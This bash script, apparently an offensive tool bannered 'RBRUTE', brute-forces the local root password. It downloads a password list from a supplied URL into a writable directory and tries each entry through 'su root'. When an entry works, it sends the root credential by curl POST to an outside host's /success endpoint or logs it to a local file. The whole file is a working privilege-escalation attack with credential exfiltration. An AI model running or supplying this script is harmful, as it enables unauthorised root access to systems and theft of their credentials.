#!/bin/bash

usage () {
  HELP="
  Usage: /bin/bash main.sh [options]
  Options available to this script:
  -url  : Specify url from where password list could be downloaded;

  -host : Specify host to where all attempts could be logged;
  (host must have 2 endpoints: <host>:<port>/success and <host>:<port>/error,
  if no host specified - trying to log to dir available for current user);
  "
  echo "$HELP" 1>&2; exit 1
}

cool_preset() {
  text="
██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗
██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
"
  echo "$text"

}

check_permissions() {
  user=$(whoami)
  if [ $? -ne 0 ]; then
    >&2 echo "Can't parse username. Terminating the process..."
    exit
  fi
}

while getopts "h?u:" opt; do
  case "${opt}" in
  h)
    h="${OPTARG}"
    if [ -z "$h" ]; then echo "No hostname specified. Using current machine for logging."
    fi
    ;;
  u)
    u="${OPTARG}"
    ;;
  *)
    usage
  esac
done
shift $((OPTIND-1))
if [ -z "$u" ] && [ -z "$h" ]; then
  usage
fi
cool_preset


array_fill() {
    # shellcheck disable=SC2046
    array=()
    check_permissions
    echo "User found successfully: $user"
    output=$(find . -user "$user" -type d -writable -executable || >&2 echo "find is not executable")
    while IFS= read -r line; do
      array+=("$line")
    done <<< "$output"

    if [ -z "${array[0]}" ] || [ ${#array[@]} -eq 0 ]; then
      echo "No directories for user: $user. Terminating the process..."
      exit
    else
      echo "Example dir: ${array[0]}"
      echo "Amount of available directories: ${#array[@]}"
    fi
}

list_actions() {
  random_chose=$((1 + "$RANDOM" % ${#array[@]}))
  curl "$u" --output "${array[$random_chose]}/pass.txt" 1>/dev/null
  if [ $? -ne 0 ]; then
    echo "Could not download file from $u"
    exit
  else
    echo "Trying to chmod of downloaded file..."
    chmod 777 "${array[$random_chose]}/pass.txt"
    if [ $? -ne 0 ]; then
      echo "Can't change permissions for this file..."
      exit
    else
      echo "Changed permissions of file ${array[$random_chose]}/pass.txt"
    fi
  fi
}

main() {
  array_fill
  list_actions
  while IFS= read -r line; do
    echo "$line"
    echo "$line" | timeout 0.07 su root -c whoami 2>/dev/null
    if [ $? = 0 ]; then
      echo "Success!"
      if [ "$h" ]; then
        curl -X POST -d "username=root&password=$line" -H "Content-type: text/html" -X POST "$h/success"
      else
        echo "username=root&password=$line" >> "${array[$random_chose]}/result.txt"
        echo "Result logged in: ${array[$random_chose]}/result.txt"
      fi
    fi
  done < "${array[$random_chose]}/pass.txt"

  wait
}

main